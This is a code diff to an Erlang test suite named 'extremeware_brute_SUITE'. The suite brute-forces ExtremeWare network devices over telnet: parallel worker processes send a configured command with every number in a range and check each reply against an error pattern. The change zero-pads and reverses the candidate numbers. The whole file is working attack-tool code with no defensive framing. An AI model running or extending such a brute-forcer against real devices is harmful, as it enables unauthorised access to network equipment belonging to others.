@@ -1,7 +1,7 @@
 -module(extremeware_brute_SUITE).
 -export([all/0,suite/0,main/1]).
 
--record(settings,{threads,limit,command,error,error_mp=undefined}).
+-record(settings,{threads,limit,command,error,error_mp=undefined,positions=undefined}).
 
 suite() ->
 	ct:require(ew_telnet), [{timetrap,infinity},{silent_connections,[telnet]}].
@@ -21,7 +21,7 @@ main(_) ->
 	process_flag(trap_exit, true),
 	PreSettings = set_ew_defaults(ct:get_config(extremeware),#settings{}),
 	{ok,Mp} = re:compile(PreSettings#settings.error,[firstline]),
-	Settings = PreSettings#settings{error_mp=Mp},
+	Settings = PreSettings#settings{error_mp=Mp,positions=length(integer_to_list(PreSettings#settings.limit))},
 	Threads = Settings#settings.threads, Limit = Settings#settings.limit,
 	NZeroIncl = Threads - 1, NWOLast = NZeroIncl - 1,
 	Size = Limit div Threads, Delta = Limit - (Size * Threads),
@@ -36,9 +36,12 @@ main(_) ->
 part(N,S,D,Settings) ->
 	M = N * S,
 	Fragment = lists:seq(M + 1,M + S + D),
+	FragmentOptimized = lists:map(fun(X) ->
+		lists:reverse(string:right(integer_to_list(X),Settings#settings.positions,$0)) end,Fragment),
 	%timer:sleep(1000),
-	Pid = spawn_link(fun() -> worker({Fragment},Settings) end),
-	ct:pal("Thread ~w starts at ~w",[Pid,M + 1]),
+	Pid = spawn_link(fun() -> worker({FragmentOptimized},Settings) end),
+	[F|_] = FragmentOptimized,
+	ct:pal("Thread ~w starts at ~s (~w)",[Pid,F,M + 1]),
 	Pid.
 worker({L},Settings) ->
 	receive
@@ -52,11 +55,11 @@ worker({L},Settings) ->
 worker({Handler,[X|Xs]},Settings) ->
 	receive
 		stop ->
-			%ct:pal("Halting on ~w",[X]),
+			%ct:pal("Halting on ~s",[X]),
 			worker({Handler,[]},Settings)
 		after 0 ->
 			%timer:sleep(500),
-			ok = ct_telnet:sendf(Handler,"~s ~B",[Settings#settings.command,X]),
+			ok = ct_telnet:sendf(Handler,"~s ~s",[Settings#settings.command,X]),
 			{ok,Data} = ct_telnet:get_data(Handler),
 			case Data of
 				[] ->
